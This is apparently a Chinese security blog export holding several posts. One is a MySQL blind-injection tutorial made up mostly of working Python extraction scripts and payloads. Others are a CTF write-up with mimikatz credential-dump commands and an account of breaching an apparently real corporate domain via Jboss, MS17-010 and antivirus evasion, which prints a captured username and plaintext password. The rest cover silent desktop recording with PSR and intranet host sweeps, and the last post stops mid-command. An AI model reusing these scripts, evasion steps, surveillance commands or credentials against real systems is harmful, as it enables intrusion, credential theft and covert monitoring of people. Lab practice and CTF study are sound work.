    <content type="text"><![CDATA[一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。 12工具：编码转换工具编译：VS2015 C#(.NET Framework v4.0) 先看一下效果图： 其中有个bug，就是ASCii不归零，也不知道是怎么回事。 默认的textBox获取方式为Encoding.Default.GetBytes(str)，注意的是要使用UTF8，代码有些丑陋，就不贴了。 在写到Base32的时候，没找到现成的方法可以直接利用，所以就去了解了下、 Base32是由ABCDEFGHIJKLMNOPQRSTUVWXYZ234567组成的,由于0和1由于与字母O和I相似性而被跳过。 规则： 12任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)对切分而成的每个组进行编码得到1个可见字符。 演示：（以rcoil字符串进行编码） 123字符rcoil取ASCII码之后，对其转换成二进制（切5补0）得到01110,01001,10001,10110,11110,11010,01011,01100计算每组二进制对应的十进制，然后参考Base32编码表，组成密文 具体的算法就是这样，有了流程就可以写代码了。 后来找了找，能找到一些别人已经写好的类。Base32 Decoding，直接利用就可以了。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL-盲注浅析]]></title>
    <url>%2F2017%2F11%2FMySQL-%E7%9B%B2%E6%B3%A8%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[起源是上交高校运维比赛（EIS_CTF）其中的一道盲注题，所以使用sqli-labs进行一个复习，权当是盲注的一个复习。 前言所有的测试均为无WAF的情况下进行。 注释关键字123-- # 单行注释，两个-连接符后面紧跟着一个空格# # 单行注释/**/ # 多行注释 实践效果：1234567891011121314151617mysql&gt; SELECT username,password FROM `users` WHERE id = &apos;2&apos;#&apos; LIMIT 0,1; -&gt; ;+----------+------------+| username | password |+----------+------------+| Angelina | I-kill-you |+----------+------------+1 row in setmysql&gt; SELECT username,password FROM `users` WHERE id = &apos;2&apos;-- &apos; LIMIT 0,1; -&gt; ;+----------+------------+| username | password |+----------+------------+| Angelina | I-kill-you |+----------+------------+1 row in set 都是可以正常得到查询的结果说明后面的SQL语句已经被我们注释掉了 Sql注入截取字符串常用函数在不回显的情况下，多数情况下都会用到截取字符串的问题，也就是在盲注的情况下，需要一个一个字符的去猜解，其中就需要截取字符串。 mid()函数语法为：1SELECT MID(column_name,start[,length]) FROM table_name; column_name 必需。要提取字符的字段。 start 必需。规定开始位置（起始值是 1）。 length可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。我们就直接使用sqli-labs的数据库进行演示。12345678database()为security mysql&gt; select mid(database(),1,4);+---------------------+| mid(database(),1,4) |+---------------------+| secu |+---------------------+1 row in set 其中column_name内容可为自行构造的sql语句。 substr()函数语法为：1SELECT SUBSTR(column_name,start[,length]) FROM table_name; 描述和用法与mid()函数是一样的1234567mysql&gt; select substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1);+--------------------------------------------------------------------------------------------------------+| substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1) |+--------------------------------------------------------------------------------------------------------+| e |+--------------------------------------------------------------------------------------------------------+1 row in set Left()函数语法为：1SELECT LEFT(ARG,LENGTH) FROM table_name; 取一个字符串的前若干位1234567mysql&gt; select left(database(),4);+--------------------+| left(database(),4) |+--------------------+| secu |+--------------------+1 row in set 布尔SQL盲注用sqli-labs的第6题作为例子 先手工fuzz一下。123http://192.168.2.100/sqli-labs/Less-6/?id=-1http://192.168.2.100/sqli-labs/Less-6/?id=1&apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot; &quot;报错，继续fuzz12http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;and&quot;1&quot;=&quot;1http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;and&quot;1&quot;=&quot;2 存在注入，但是没有回显，判断为可盲注。测试一下(其实盲注的脚本真的就只是这几行，难度无非是在waf过滤函数的替换绕过)。123456789101112131415161718# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;print(&quot;获取数据库长度&quot;)for i in range(1, 32): payload = &quot;and length(database())=%d--+&quot; % i res = requests.get(url + payload) if &quot;You are in...........&quot; in res.text: print(&quot;[+]数据库长度为:&quot; + str(i) + &quot;位&quot;) break结果为/usr/bin/python2.7 /home/rcoil/PycharmProjects/demo/demo.py获取数据库长度[+]数据库长度为:8位Process finished with exit code 0 所以证明注入确实存在且为盲注,浏览器验证下。 获取数据库名字先测试（fuzz）发现是可行的。然后写脚本进行猜解。12345678910111213141516# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;print(&quot;获取数据库名字&quot;)database = &apos;&apos;for i in range(1, 10): for j in range(97, 123): payload = &quot;and mid(database(),1,%d)=&apos;%s&apos;--+&quot; % (i, database + chr(j)) res = requests.get(url + payload) if &quot;You are in...........&quot; in res.text: database += chr(j) print(&quot;[-]当前猜解:&quot; +database) breakprint(&quot;[+]当前数据库:&quot; +database) 如果出现编码问题，要注意的是headers中Content-Type的值，必要的时候带入headers进行访问 获取表名1234567mysql&gt; select mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,2);+-----------------------------------------------------------------------------------------------------+| mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,2) |+-----------------------------------------------------------------------------------------------------+| em |+-----------------------------------------------------------------------------------------------------+1 row in set 所以接下来代码为123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;table_names = &apos;&apos;for i in range(0, 8): for k in range(1, 32): for j in range(97, 123): payload = &quot;and mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit %d,1),1,%d)=&apos;%s&apos;--+&quot; % (i, k, table_names+chr(j)) request = requests.get(url + payload) if &quot;You are in&quot; in request.text: table_names += chr(j) print(&quot;第&quot; + str(i + 1) + &quot;张表的名字为&quot; + table_names) break 我发现，如果想要优雅一些，用ascii()或者改变k的位置比如1and ascii(mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j) 但是这样子的话，到最后，所有的table_names都拼接一起（后面补充）。 获取列名1234567mysql&gt; select mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,4);+------------------------------------------------------------------------------------------------------------------------------+| mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,4) |+------------------------------------------------------------------------------------------------------------------------------+| user |+------------------------------------------------------------------------------------------------------------------------------+1 row in set 代码和上面的没区别123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;column_names = &apos;&apos;for i in range(0, 8): for k in range(1, 32): for j in range(97, 123): payload = &quot;and ascii(mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j) request = requests.get(url + payload) if &quot;You are in&quot; in request.text: column_names += chr(j) print(&quot;第&quot; + str(i + 1) + &quot;列字段名为&quot; + column_names) break 爆字段123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;column_names = &apos;&apos;for i in range(0, 8): for k in range(1, 32): for j in range(21, 127): payload = &quot;and ascii(mid((select username from security.users limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j) request = requests.get(url + payload) if &quot;You are in&quot; in request.text: column_names += chr(j) print(&quot;第&quot; + str(i + 1) + &quot;行数据为&quot; + column_names) break 这个布尔SQL盲注暂时分析到这里。如果想要一脚本搞定以上所有的内容，那就def一下就很方便调用了。写到这里的时候，我发现，所有的脚本都有很多的相同点，只需要更换变量就可以直接使用。而且，在去翻资料的过程中，我发现在bool盲注中二分法比穷举要快一些，所以我参照王一航的思路进行改写。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python# encoding:utf8import requestsimport sysurl = &quot;http://192.168.2.100/sqli-labs/Less-6/?id=&quot;# 定义payloaddef exce(database_name, table_name, column_name, Result, Char, mid): global url esndStr = &quot; and\&quot;1\&quot;=\&quot;1&quot; payload = &quot;1\&quot;and(ascii(mid((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; limit &quot; + Result + &quot;,1),&quot; + Char + &quot;,1))&gt;&quot; + mid + &quot;)&quot; tempurl = url + payload + esndStr request = requests.get(tempurl).text if &quot;You are in...........&quot; in request: return True else: return False# 二分查询def doubleSearch(database_name, table_name, column_name, Result, Char, left_number, right_number): while left_number &lt; right_number: mid = int((left_number + right_number) / 2) if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)): left_number = mid else: right_number = mid if right_number-left_number == 1: if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)): mid += 1 break else: break return chr(mid)# 定义所有变量初始def getAllData(database_name, table_name, column_name): for i in range(32): counter = 0 for j in range(32): counter += 1 temp = doubleSearch(database_name, table_name, column_name, i, j, 0, 127) # 从255开始查询 if ord(temp) == 1: break sys.stdout.write(temp) sys.stdout.flush() if counter == 1: break sys.stdout.write(&quot;\r\n&quot;) sys.stdout.flush()def getAllSchemaNames(): return getAllData(column_name=&quot;schema_name&quot;, table_name=&quot;schemata&quot;, database_name=&quot;information_schema&quot;)getAllSchemaNames() 大致思想：1、mid为left和right的中间值，mid是否和left相等（right-left=1），相等跳到5，如果不等跳到22、请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到43、返回页面正确，将left赋值为mid4、返回页面错误，将right赋值为mid5、返回mid值 二分法它的原理是把可能出现的字符看做一个有序的序列，这样在查找所要查找的元素时,首先与序列中间的元素进行比较,如果大于这个元素,就在当前序列的后半部分继续查找,如果小于这个元素,就在当前序列的前半部分继续查找,直到找到相同的元素,或者所查找的序列范围为空为止。 如果需要查找数据表和数据表的内容，在getAllSchemaNames()添加个where语句 时间的SQL盲注延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术。 延迟注入主要点是在于if()函数的判断、1if(condition,true,false) //条件语句 condition 是判断条件 true 和false 是符合condition自定义的返回结果。 本地测试感受一下1234567891011121314151617181920212223mysql&gt; select ascii(mid(database(),1,1));+----------------------------+| ascii(mid(database(),1,1)) |+----------------------------+| 115 |+----------------------------+1 row in set (0.00 sec)mysql&gt; select if(ascii(mid(database(),1,1))=115,sleep(5),1);+-----------------------------------------------+| if(ascii(mid(database(),1,1))=115,sleep(5),1) |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (5.01 sec) mysql&gt; select if(ascii(mid(database(),1,1))=114,sleep(5),1);+-----------------------------------------------+| if(ascii(mid(database(),1,1))=114,sleep(5),1) |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec) 如果condition判断为正确，则产生延迟，否则不产生延迟。至于脚本，修改下上面的脚本进行判断即可。123456789101112url = &quot;http://192.168.2.100/sqli-labs/Less-9/?id=&quot;esndStr = &quot; and sleep(3))--+&quot;payload = &quot;1&apos; and ((ascii(mid((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; limit &quot; + Result + &quot;,1),&quot; + Char + &quot;,1))&gt;&quot; + mid + &quot;)&quot;tempurl = url + payload + esndStrbefore_time = time.time()requests.head(tempurl)after_time = time.time()use_time = after_time - before_timeif abs(use_time) &lt; 0.1: return Trueelse: return False 报错的SQL盲注如果页面上显示数据的报错信息，那么可以直接使用报错的方式把想要的信息爆出来。 比如在mysql中我们可以使用如下的经典语句进行报错。1select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x; 这是网上流传很广的一个版本，可以简化成如下的形式。1select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果关键的表被禁用了，可以使用这种形式1select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) 如果rand被禁用了可以使用用户变量来报错1select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) 其实这是mysql的一个bug所引起的，其他数据库都不会因为这个问题而报错。 另外，在mysql5.1版本新加入两个xml函数，也可以用来报错。1234mysql&gt; select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));ERROR 1105 (HY000): XPATH syntax error: &apos;\admin888&apos; mysql&gt; select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1)); ERROR 1105 (HY000): XPATH syntax error: &apos;^$admin888^$&apos; 而在其他数据库中也可以使用不同的方法构成报错12345PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- MSSQL: /?param=1 and(1)=convert(int,@@version)-- Sybase: /?param=1 and(1)=convert(int,@@version)-- Oracle &gt;=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)-- 参考：详解SQL盲注测试高级技巧MYSQL注入天书之盲注讲解]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[平衡信息杯-Write-Up]]></title>
    <url>%2F2017%2F10%2F%E5%B9%B3%E8%A1%A1%E4%BF%A1%E6%81%AF%E6%9D%AF-Write-Up%2F</url>
    <content type="text"><![CDATA[南宁市第二届网络与信息安全技术大赛 BasicBasic_100-神秘二进制这二进制莫名其妙，因为没人能做出，所以就改题了。 Basic_100_2-Finally, You get flag!附件是一个base64的加密,只要解密就可以看到flag Basic_200这道题怎么说呢，看图就知道了。 WebWeb_100附件的代码为：123&lt;script&gt;eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;2 c=E;g m()&#123;2 8=p.q;2 6=l j();f(8.w(&quot;?&quot;)!=-1)&#123;2 h=8.r(1);5=h.9(&quot;&amp;&quot;);d(2 i=0;i&lt;5.o;i++)&#123;6[5[i].9(&quot;=&quot;)[0]]=u(5[i].9(&quot;=&quot;)[1])&#125;&#125;v 6&#125;g n(4,s,e)&#123;7=&quot;&quot;;d(i=0;i&lt;4.o;i++)&#123;k=(s+e)%c;t=e;e=s+e;s=t;7+=4[i]^k&#125;f(7==&quot;x&quot;)b.a(&quot;C\&apos;s z!&quot;);B b.a(&quot;A\&apos;s y!&quot;)&#125;2 3=l j();3=m();b.a(3);n(3[\&apos;4\&apos;],F,D);&apos;,42,42,&apos;||var|Request|key|strs|theRequest|cipher|url|split|log|console|iv|for||if|function|str||Object||new|GetRequest|enc|length|location|search|substr|||unescape|return|indexOf|34558914423312210022264341011282361161032135513678115123012499|Wrong|Right|Something|else|That|21|0xff|13&apos;.split(&apos;|&apos;),0,&#123;&#125;))&lt;/script&gt; 用http://jsbeautifier.org/进行解密之后为：1234567891011121314151617181920212223242526272829var iv = 0xff;function GetRequest() &#123; var url = location.search; var theRequest = new Object(); if (url.indexOf(&quot;?&quot;) != -1) &#123; var str = url.substr(1); strs = str.split(&quot;&amp;&quot;); for (var i = 0; i &lt; strs.length; i++) &#123; theRequest[strs[i].split(&quot;=&quot;)[0]] = unescape(strs[i].split(&quot;=&quot;)[1]) &#125; &#125; return theRequest&#125;function enc(key, s, e) &#123; cipher = &quot;&quot;; for (i = 0; i &lt; key.length; i++) &#123; k = (s + e) % iv; t = e; e = s + e; s = t; cipher += key[i] ^ k &#125; if (cipher == &quot;34558914423312210022264341011282361161032135513678115123012499&quot;) console.log(&quot;That&apos;s Right!&quot;); else console.log(&quot;Something&apos;s Wrong!&quot;)&#125;var Request = new Object();Request = GetRequest();console.log(Request);enc(Request[&apos;key&apos;], 13, 21); 反推12345678910function enc(key, s, e) &#123; cipher = &quot;&quot;; for (i = 0; i &lt; key.length; i++) &#123; k = (s + e) % iv; t = e; e = s + e; s = t; cipher += key[i] ^ k &#125; if (cipher == &quot;34558914423312210022264341011282361161032135513678115123012499&quot;) console.log(&quot;That&apos;s Right!&quot;); 得出key为000000003007006000702000结合function GetRequest得出payload为1?key=000000003007006000702000 但是提交结果不对。过了大半天，但是一个人都没解出来，官方给出hintemmmmm，这题就这样吧，看不懂。果然100分。 Web_200转啊转，转啊转，信息收集。 这个input、这个URL格式，不正是今年NodeJS RCE 参考了这个利用 Node.js 反序列化漏洞远程执行代码但是没成功，弹不了shell的，群里说，直接读直接读。但是我没能直接读出来，得把结果扔到vps上。payload出自于如何使用NodeJS写出一枚远程命令执行(RCE）漏洞 Web_300直接sqlmap就行了。1234567891011121314sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=8 AND 4897=4897 Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=8 AND SLEEP(5)---[13:39:29] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL &gt;= 5.0.12 MiscMisc_200_2这题一直在踩内部doc的坑。 Misc_300先用脚本提取Pcapng中的菜刀流量，这题最大的坑就是数据包有点大大大大大大了。看到了ProcDump很关键，这道题可能就是利用了ProcDump+mimikatz的组合，毕竟毕竟这样免杀。先导出http，找到了关键点（其实dump的结果都不小），辣鸡数据包、辣鸡电脑，卡到生活不能自理。规则为frame.len == 533,追踪流确实看到关键字将数据抠出来，使用mimikatz进行恢复，但是恢复过程中还是出现不少问题，抠出来的数据恢复不了，mimikatz没注意是32还是64等等。。。123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full MobileAndroid_crackme1先用jadx反编译apk就一个控件。往下看，了解这个程序的主要思想：输入的Password值，经过CryptClass后，得到的加密结果是否匹配cip，正确就输出Bingo。重点查看123String enc = CryptClass.encrypt_str(passstr, (String) keys.get(passstr.length() % keys.size()));if (enc.equals(MainActivity.this.cip)) &#123; Toast.makeText(MainActivity.this, &quot;Bingo!&quot;, 1).show(); 首先还是得去弄明白它们的值是怎么来的。 看到R.string.key6，然后去找这个key6，但是找到的是1public static final int key6 = 2131165222; 有安卓开发的人都知道，编写java代码中的常量在一般情况下，我们是定义在string.xml这个文件中，这个string.xml的值会被R文件映射。123this.Password = (EditText) findViewById(R.id.editText5);this.Cipher = (EditText) findViewById(R.id.editText6);this.cip = getString(R.string.key6); Password值是编辑框接受输入的值，为后续的passstrCipher值不知道干啥cip值为05bfed10af08193ff0b218e887c53dfa162f8a6e8bpassstr.length() % keys.size()的理论值为0,1,2,3,4,5，主要看passstr的长度，因为是passstr的长度决定了调用哪一个keys验证得出passstr的长度以及keys值这样我们就可以得出passstr的长度为21，使用的keys为3，也就是NO1bgoMn14J85yrLQHM9KoZJ 接下来，就看看怎么解密了。看了下，我选择了爆破的方式。在验证passstr的长度以及keys值的时候，发现输入的password值个数是21个，加密后个数变为42，也就是说1个字符加密得出2个字符。那我们就将cip拆开进行每位数的验证顺便说一句，上图不应该是解密，应为加密，还有就是Eclipse的调试不够人性化。拆开验证是： 看了各位大佬的wp，才发现，CryptClass类里面是有解密函数的。 ReVwindows_crackme2菜鸡总是看哪些题是多人解出来之后就去做哪题。扔进ILSpy没看到源码，扔进Reflector拿到源码。Form1的内容为机器码12345public Form1()&#123; this.InitializeComponent(); this.textBox1.Text = &quot;SzLPCCA4&quot;;&#125; 我们要找出相应的注册码，先看源码。12345678910111213141516171819202122232425262728293031323334353637private void button1_Click(object sender, EventArgs e)&#123; string text = this.textBox2.Text; //注册码框 SHA1 sha = new SHA1CryptoServiceProvider(); //Sha1编码 byte[] bytes = Encoding.Unicode.GetBytes(this.textBox1.Text); string str2 = BitConverter.ToString(sha.ComputeHash(bytes)); //对SzLPCCA4进行Sha1编码 string str3 = new string(text.ToCharArray().Reverse&lt;char&gt;().ToArray&lt;char&gt;()); //对输入的注册码进行反转 string str4 = &quot;&quot;; int num = 0; for (int i = 0; i &lt; str3.Length; i++) &#123; if (text[i] != &apos;-&apos;) &#123; num++; str4 = str4 + str3[i].ToString(); if (num == 2) &#123; num = 0; if (i != (str3.Length - 1)) &#123; str4 = str4 + &quot;-&quot;; &#125; &#125; &#125; &#125; string str5 = AESEncrypt(str2, &quot;H8vY7QKY&quot;, &quot;8@Z&gt;FXsv&quot;); //对sha1编码后的SzLPCCA4进行AES加密 string str6 = AESEncrypt(str4, &quot;H8vY7QKY&quot;, &quot;8@Z&gt;FXsv&quot;); //对反转后的注册码进行AES加密 if (str5 == str6) &#123; MessageBox.Show(&quot;再来一瓶!&quot;); &#125; else &#123; MessageBox.Show(&quot;谢谢参与!&quot;); &#125;&#125; 主体的思想为： 机器码：Sha1编码后再进行AES加密的值为str5注册码：反转后再进行AES加密的值为str6如果str5等于str6则返回再来一瓶，flag则为输入的注册码 解题思路： AES加密的密钥都是一样的，所以加密前是相等的。只要将机器码进行Sha1编码后再反转就是注册码也就是将str2进行输出后反转或者反转后输出 demo为：1234567public static void Main(string() args)&#123; SHA1 sha = new SHA1CryptoServiceProvider(); byte[] bytes = Encoding.Unicode.GetBytes(&quot;SzLPCCA4&quot;); string str2 = BitConverter.ToString(sha.ComputeHash(bytes)); MessageBox.Show(str2);&#125; 得到的结果为0AC8B571539392065B0B160148832CA2DC2710A1,进行反转且八位每段得出flag。1A0172CD-2AC23884-1061B0B5-60293935-175B8CA0 最后附张图：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jboss引起的内网渗透]]></title>
    <url>%2F2017%2F10%2FJboss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[待人如知己切入点为Jboss反序列化，就不多说了，远程部署war。war中包含了1shell、reGeorg、https.exe 使用https.exe反弹一个msf的shell，不多说，上远控巩固权限。 P·S：图片是后面补上的 信息收集查看进程信息是否有杀软看了一轮没有什么主流的杀软MsMpEng.exe是属于Windows Defender 自动保护服务的核心进程。 12345systeminfoipconfig /allnet viewpingnet time /domain 综合以上信息ipconfig /all的信息，DNS suffix search list是xxx.com,nds服务器是xx.18,备份nds服务器为xx.19。net time /domain 指向的是xx.17的机器，ping xxx.com指向xx.18(第二天ping xxx.com结果为xx.17)，到第三天再看，又发现是xx.18的。得到的结果： 192.168.1.17 为域控192.168.1.18和192.168.1.19为DNS服务器，不确定是否为域控 不确定的话就下一步确认、12net group &quot;domain admins&quot; /domain #查看域管理员net group &quot;domain controllers&quot; /domain #查看域控制器 结果为：那就可以明确xx.17，xx.18，xx.19为域控制器 小小免杀因为是存在着MsMpEng.exe，所以如果不做一些免杀的话，是会被杀掉的。使用Cobalt Strike生成一个exe和bin文件，将两者进行混淆，最后生成一个新的exe 横向渗透由于是Jboss反序列化为入口(正常不存在提权情况)，在控制台处可以看到类似日志的IP记录，发现了内网还有个172.18.19.10的IP，所以判断还有这么一个段的存在。进到机器上面却没有看到有链接 = = 组策略漏洞（GPP）12net use e: \\192.168.1.17\\sysvol（三台）dir /s groups.xml 找不到groups.xml，这条路不通。 MS17-010先着手用MS17-010打一轮，打一轮再说。留着后面没思路的时候抓密码用。12345678910MS17-010 FCE-3212：192.168.1.92 Windows 7 Professional 7601 SP 1 FCE-3235：192.168.1.126 Windows 7 Professional 7601 SP 1 FCE-PLOT：192.168.1.217 Windows xp [!] Target could be either SP2 or SP3 *** *** *** MS14-068 KERBEROS漏洞之前也没怎么用过这个漏洞。要测试这个漏洞，前提还是要明白kerberos的整个认证协议过程，不然是不会明白原理的，测试过程中出了什么问题也不知道怎么解决。利用这个漏洞，我们需要一个普通域用户的账户名和密码或者是哈希，哈希传递我已经在别的文章中总结了，其实哈希和密码是有相同的效果。以及域名称，该用户的sids。 而我们在信息收集的时候，已经将靶机上的域用户账号密码抓取,但是我们不知道域控上面是否存在这个漏洞。经过一轮测试，发现MS14-068失败。 抓密码靶机上抓不到域管，那就去别的机器去抓。先将有MS17-010的抓一轮，幸运的话，就直接可以了。12345678FCE-3212：192.168.1.92 Windows 7 Professional 7601 SP 1 * Username : jduffy * Password : papap111FCE-UTIL：192.168.1.230 Windows 7 Professional 7601 SP 1 * Username : ComputerRoom * Password : papap duang的一样，很幸运，在第二台的时候就发现有域管了。附张图 我在dumn密码的时候发现一个很奇怪的问题，我打的是192.168.1.244，但是返回来的结果是192.168.1.37的结果，所以我去看了ipconfig /all我就懵了，这不知道是啥情况。 如果MS17-010行不通的话就开始找漏洞配置不当以获取更多主机权限，然后再继续抓密码。这些在之前的文章是总结过的。 擦干屁股开溜了，至于内网的广度和深度就不做研究了。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巧妙利用win自带的 PSR 实现监控Windows桌面]]></title>
    <url>%2F2017%2F09%2F%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8win%E8%87%AA%E5%B8%A6%E7%9A%84-PSR-%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7Windows%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。 唯一的限制：要求系统是windows 7之后，也就是在做个人机的时候可以使用，不排除个别的情况。之前不知道有命令行的方法，直到看了三好学生的paper（这段时间一直在啃）。 进阶直接查看进阶只用方法。123456789101112131415161718psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;][/sketch (0|1)] [/slides (0|1)] [/gui (0|1)][/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)][/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]/start 开始录制，需要指定文件保存路径/stop 停止录制 /sc 捕捉记录步骤的截图，0|1/maxsc 最大的截图数量/maxlogsize 最大日志文件大小(MB)/gui 是否显示psr的界面，0|1 /arcetl Include raw ETW file in archive output./arcxml Include MHT file in archive output./recordpid Record all actions associated with given PID./sketch Sketch UI if no screenshot was saved./slides Create slide show HTML pages./output 保存的输出路径/stopevent Event to signal after output files are generated. 示例：123456psr.exe /start /gui 0 /output C:\windows\temp\capture.zip 后台启动psr并开始录制，文件保存为C:\windows\temp\capture.zipStart-Sleep -s 10; 等待10s，即录制时间为10spsr.exe /stop; 结束录制，自动退出 压缩包内是mht格式,直接用IE打开就好。效果为： 防御 小结利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，bat+定时任务，一定会用上它。 【参考】渗透技巧——如何巧妙利用PSR监控Windows桌面]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网存活扫描]]></title>
    <url>%2F2017%2F08%2F%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。 icmp扫描基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如cping。 在win下使用icmp扫描 cmd中执行如下命令，对整个C段进行ping扫描 1for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot; 利用powershell对目标内网进行icmp扫描 123powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot; 目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.3.1 - 192.168.31.254` 在linux下使用各类icmp扫描 最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可 1234567891011#!/bin/bashfor ip in 192.168.1.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done或者for i in 192.168.4.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done nmap的icmp扫描 1nmap -sn -PE 192.168.1.0/24 arp扫描在win下使用各种arp扫描123start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txtpowershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot; &gt;&gt; result.txt 在 linux 下使用 arp 扫描1234567891011# wget https://nmap.org/dist/nmap-7.40.tar.bz2# bzip2 -cd 